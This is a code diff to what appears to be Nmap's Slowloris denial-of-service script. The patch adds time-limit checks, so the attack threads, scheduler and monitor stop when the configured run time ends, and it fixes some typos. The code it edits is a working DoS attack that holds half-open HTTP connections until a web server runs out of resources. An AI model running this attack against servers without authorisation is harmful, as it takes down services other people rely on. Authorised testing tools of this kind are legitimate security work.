@@ -14,7 +14,7 @@ Slowloris was described at Defcon 17 by RSnake
 (see http://ha.ckers.org/slowloris/).
 
 This script opens and maintains numerous 'half-HTTP' connections until
-the server runs out of ressources, leading to a denial of service. When
+the server runs out of resources, leading to a denial of service. When
 a successful DoS is detected, the script stops the attack and returns
 these pieces of information (which may be useful to tweak further
 filtering rules):
@@ -62,16 +62,14 @@ portrule = shortport.http
 
 local SendInterval
 local TimeLimit
-
+local end_time
 
 -- this will save the amount of still connected threads
 local ThreadCount = 0
-
 -- the maximum amount of sockets during the attack. This could be lower than the
 -- requested concurrent connections because of the webserver configuration (eg
 -- maxClients on Apache)
-local Sockets = 0
-
+local Sockets = 1
 -- this will save the amount of new lines sent to the half-http requests until
 -- the target runs out of ressources
 local Queries = 0
@@ -83,12 +81,26 @@ local Reason = "slowloris" -- DoSed due to slowloris attack or something else
 local Bestopt
 
 
+local function timeout_occured()
+  if nmap.clock_ms() < end_time or TimeLimit == nil then
+    return false
+  else
+    StopAll = true
+    return true
+  end
+end
+
 -- get time (in milliseconds) when the script should finish
 local function get_end_time()
   if TimeLimit == nil then
     return -1
   end
   return 1000 * TimeLimit + nmap.clock_ms()
+end
+
+-- set Time interval for threads to sleep
+local function set_SendInterval()
+  SendInterval = math.min(SendInterval, (end_time - nmap.clock_ms())/1000)
 end
 
 local function set_parameters()
@@ -103,14 +115,14 @@ end
 local function do_half_http(host, port, obj)
   local condvar = nmap.condvar(obj)
 
-  if StopAll then
+  if timeout_occured() then
     condvar("signal")
     return
   end
 
   -- Create socket
   local slowloris = nmap.new_socket()
-  slowloris:set_timeout(200 * 1000) -- Set a long timeout so our socked doesn't timeout while it's waiting
+  slowloris:set_timeout(math.min(200 * 1000, end_time - nmap.clock_ms())) -- Set a long timeout so our socket doesn't timeout while it's waiting. At the same time left for script execution is maximum limit.
 
   ThreadCount = ThreadCount + 1
   local catch = function()
@@ -120,10 +132,17 @@ local function do_half_http(host, port, obj)
     slowloris:close()
     slowloris = nil
     condvar("signal")
+    return
   end
 
   local try = nmap.new_try(catch)
   try(slowloris:connect(host.ip, port, Bestopt))
+
+  if timeout_occured() then
+    ThreadCount = ThreadCount - 1
+    condvar("signal")
+    return
+  end
 
   -- Build a half-http header.
   local half_http = "POST /" .. tostring(math.random(100000, 900000)) .. " HTTP/1.1\r\n" ..
@@ -132,8 +151,14 @@ local function do_half_http(host, port, obj)
     "Content-Length: 42\r\n"
 
   try(slowloris:send(half_http))
-  ServerNotice = " (attack against " .. host.ip .. "): HTTP stream started."
 
+  if timeout_occured() then
+    ThreadCount = ThreadCount - 1
+    condvar("signal")
+    return
+  end
+
+  ServerNotice = " (attack against " .. host.ip .. "): HTTP stream started."
   -- During the attack some connections will die and other will respawn.
   -- Here we keep in mind the maximum concurrent connections reached.
 
@@ -141,10 +166,18 @@ local function do_half_http(host, port, obj)
 
   -- Maintain a pending HTTP request by adding a new line at a regular 'feed' interval
   while true do
-    if StopAll then
+    if timeout_occured() then
       break
     end
+    --Setting global SendInterval before and then passing it to sleep has been
+    --done so as to ensure the most updated SendInterval is assigned
+    --NOTE: Effective for large number of threads
+    set_SendInterval()
     stdnse.sleep(SendInterval)
+    --Since sleep time could be big so check is made again for timeout
+    if timeout_occured() then
+      break
+    end
     try(slowloris:send("X-a: b\r\n"))
     Queries = Queries + 1
     ServerNotice = ("(attack against %s): Feeding HTTP stream...\n(attack against %s): %d queries sent using %d connections."):format(
@@ -211,7 +244,7 @@ local function do_monitor(host, port)
         stdnse.sleep(10)
         monitor:close()
       end
-      if StopAll then
+      if timeout_occured() then
         break
       end
     end
@@ -237,13 +270,16 @@ local function worker_scheduler(host, port)
   while not DOSed and not StopAll do
     -- keep creating new threads, in case we want to run the attack indefinitely
     repeat
-      if StopAll then
+      if timeout_occured() then
         return
       end
 
       for thread in pairs(Threads) do
         if coroutine.status(thread) == "dead" then
           Threads[thread] = nil
+        end
+        if timeout_occured() then
+          return
         end
       end
       stdnse.debug1("[SCHEDULER]: starting new thread")
@@ -275,14 +311,14 @@ action = function(host, port)
 
   stdnse.debug1("[MAIN THREAD]: starting scheduler")
   stdnse.new_thread(worker_scheduler, host, port)
-  local end_time = get_end_time()
+  end_time = get_end_time()
   local last_message
   if TimeLimit == nil then
     stdnse.debug1("[MAIN THREAD]: running forever!")
   end
 
   -- return a live notice from time to time
-  while (nmap.clock_ms() < end_time or TimeLimit == nil) and not StopAll do
+  while not timeout_occured() and not StopAll do
     if ServerNotice ~= last_message then
       -- don't flood the output by repeating the same info
       stdnse.debug1("[MAIN THREAD]: " .. ServerNotice)
@@ -296,7 +332,6 @@ action = function(host, port)
 
   stop = os.date("!*t")
   dos_time = stdnse.format_difftime(stop, start)
-  StopAll = true
   if DOSed then
     if Reason == "slowloris" then
       stdnse.debug2("Slowloris Attack stopped, building output")
